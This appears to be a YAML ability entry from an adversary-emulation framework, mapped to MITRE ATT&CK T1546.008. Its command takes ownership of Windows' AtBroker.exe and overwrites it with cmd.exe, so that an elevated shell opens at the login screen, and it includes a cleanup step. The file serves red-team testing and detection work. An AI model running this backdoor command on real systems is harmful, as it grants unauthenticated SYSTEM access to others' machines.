- id: 210be7ea-d841-40ec-b3e1-ff610bb62744
  name: Replace AtBroker.exe (App Switcher binary) with cmd.exe
  description: Replace AtBroker.exe (App Switcher binary) with cmd.exe. This allows
    the user to launch an elevated command prompt from the login screen by locking
    and then unlocking the computer after toggling on any of the accessibility tools
    in the Accessibility menu.
  tactic: privilege-escalation
  technique:
    attack_id: T1546.008
    name: 'Event Triggered Execution: Accessibility Features'
  platforms:
    windows:
      sh:
        command: IF NOT EXIST C:\Windows\System32\AtBroker_backup.exe (copy C:\Windows\System32\AtBroker.exe
          C:\Windows\System32\AtBroker_backup.exe) ELSE ( pushd ); takeown /F C:\Windows\System32\AtBroker.exe
          /A; icacls C:\Windows\System32\AtBroker.exe /grant Administrators:F /t;
          copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\AtBroker.exe
        cleanup: copy /Y C:\Windows\System32\AtBroker_backup.exe C:\Windows\System32\AtBroker.exe
        elevation_required: true
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
